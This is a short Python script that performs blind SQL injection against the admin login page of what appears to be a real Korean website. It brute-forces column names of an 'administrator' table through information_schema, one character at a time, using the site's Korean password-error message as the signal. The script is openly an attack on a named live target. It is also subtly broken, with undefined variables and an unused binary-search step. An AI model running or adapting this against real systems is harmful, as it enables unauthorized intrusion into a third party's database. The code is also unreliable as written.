import requests
import time

s= requests.Session()

URL ="http://g-learning.co.kr/admin/login/logprocess.jsp"

while True:
    low = 48
    high = 126
    while True:
        mid = int((low + high) / 2)

        data = {
            "id": "' or (select column_name from information_schema.columns where table_name='administrator' and table_schema=database() limit " + str(
                i) + ",1) like '" + colum + chr(low) + "%'#",
            "pw": "123",
            "url": "null"
        }

        req1 = s.post(URL, data=data)
        req1.encoding = None

        if req1.text.find("비밀번호가") > -1:
            colum = colum + chr(low)
            print(str(i + 1) + "번째 colum : " + colum + "...")
            break